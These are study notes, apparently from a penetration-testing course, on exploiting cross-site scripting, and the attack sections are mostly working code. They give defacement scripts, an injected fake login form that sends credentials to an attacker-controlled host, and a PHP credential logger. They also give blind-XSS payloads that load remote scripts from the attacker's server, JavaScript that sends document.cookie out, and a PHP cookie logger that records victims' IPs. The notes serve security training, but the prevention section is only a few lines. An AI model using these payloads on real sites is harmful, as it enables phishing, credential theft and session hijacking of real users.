# Defacing

- one of the most common attacks usually used with stored XSS is website defacing attacks
- defacing - changing its look for anyone who visits the website
- https://www.bbc.co.uk/news/technology-43812539
- such attacks can carry great media echo and may significantly affect a company's investments and share prices, and especially for banks and technology firms
- although many other vulns may be utilized to achieve the same thing, stored XSS vulns are among the most used

## Defacement Elements

- can use injected JS code (through XSS) to make a web page look any way we like
- defacing a website is usually used to send a simple message (ie - we successfully hacked you)
- Three HTML elements are usually utilized to change the main look of a web page
	- Background color `document.body.style.background`
	- Background `document.body.background`
	- Page title `document.title`
	- Page text `DOM.innerHTML`

### Changing the background

- `Stored XSS`
```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

### Changing the Page title

```html
<script>document.title = "Hacked!"</script>
```

### Changing the Page text

```html
<script>
	document.getElementById("something").innerHTML = "new text";
</script>
<script>
	$("#something").html("new text")
</script>
<script>
	document.getElementByTagName("body")[0].innerHTML = "new text";
</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

---

# Phishing

- utilize legitimate-looking information to trick the victims into sending their sensitive information to the attacker
- injecting fake login form that send the login details to the attacker's server which may then be used to login on behalf of the victim and gain control over their account and sensitive information
- steps for phishing
	- suppose we have a website which contains online image viewer and we can input a URL of an image and it'll display it

## XSS Discovery

- try to get working XSS payload which will execute the JS command
- to understand which payload should work, try to view how your input is displayed in the HTML source after you add it

## Login Form Injection

1. Form Injection

- once we identify a working XSS payload, we can proceed to the phishing attack
- to perform an XSS phishing attack, we must inject an HTML code that displays a login form on the targeted page
- this form should send the login information to a server we are listening on
- html code form may look like
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

- next, we should prepare the XSS code and test it on the vulnerable form
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

2. Cleaning up

- to clean up, we can use `document.getElementById().remove()` function
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

- we can now copy the final url which may look like
```
http://vuln-site.com/index.php?url=...Payload...
```
to victims and attempt to trick them into using the fake login form

---

## Credential Stealing

- from above example, if we tried to log into the injected login form, will get an error "This site can't be reached"
- as HTML form is designed to send the login request to our IP which should listening for a connection, we will get a site can't be reached error

- write php code
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

```sh
sudo php -S 0.0.0.0:80
```

---

# Session Hijacking or Cookie Stealing

- modern web applicaitons utilize cookies to maintain user's session throughout different browsing sessions
- enables the user to only log in once and keep their logged-in session alive
- if an attacker obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentitals


## Blind XSS Dectection

- Blind XSS vuln occurs when the vuln is triggered on a page we don't have access to
- usually occur with forms only accessible by certain users (eg - admins)
- some potential examples 
	- contact forms
	- reviews
	- user details
	- support tickets
	- HTTP User-Agent Header

- suppose a web application with registration form which contains name, password, email, website fields to input
- if we filled the form and sent, replay text with "Admin will review your registration", etc
- we cannot find XSS vulns with alert box 
- **how would we be able to detect an XSS vuln if we cannot see how the output is handled?**
- we have to use a JS payload that sends an HTTP request back to our server
- if the JS code gets executed, we will get a response on our machine and we will know that the page is vulnerable
- this introduce 2 issues
	1. How can we know which specific field is vulnerable?
		- since any of the fields may execute our code, we can't know which of them did
	2. How can we know what XSS payload to use?
		- since the page may be vulnerable, but the payload may not work

### Loading a remote script

- in HTML, we can write to include a remote script by providing its source
```html
<script src="http://our-server-ip/script.js"></script>
```

- we can identify the vulnerable input field that executed the script as 
```html
<script src="http://our-server-ip/username"></script>
```

- if we get a request for `/username`, we know that the username field is vulnerable to XSS and so on 
- with that we can start testing various XSS payloads that load a remote script and see which of them sends us a request

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

- start testing these payloads one by one using one of them for all of input fields and appending the name of the field after our IP

```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
...SNIP...
```

> Note: email must match an email format, as it seems to be validated on both the front-end and back-end. Passwords fields may be skipped as they are usually hashed and not usually shown in cleartext

- once we submit the form, we wait a few seconds and check our terminal to see if anything called our server
- if nothing calls, we can proceed to next payload and so on 
- once we received a call to our server, we should note the last XSS payload we used as a working payload and note the input field name that called our server as the vulnerable input field

- try testing various remote script XSS paylaods with the remaining input fields, and see which of them sends an HTTP request to find a working payload

### Sesison Hijacking

- once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack
- requires
	- JS payload to send us the required data 
	- PHP script hosted on our server to grap and parse the transmitted data
- JS payload to grap session cookie (write one in script.js in our server)

```javascript
document.location='http://our-server-ip/index.php?c='+document.cookie;
new Image().src='http://our-server-ip/index.php?c='+document.cookie;
```

- change the URL in the XSS payload we found earlier to use script.js
```html
<script src=http://our-server-ip/script.js></script>
```

- for better receiving and storing the cookie data
- save it as `index.php`
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

# XSS Prevention

- XSS vulnerabilities are mainly linked to two parts of the web app
	- Source : like a user input field
	- Sink : displays the input data
- important aspect of preventing XSS vulns is proper input sanitization and validation on both the front and back end
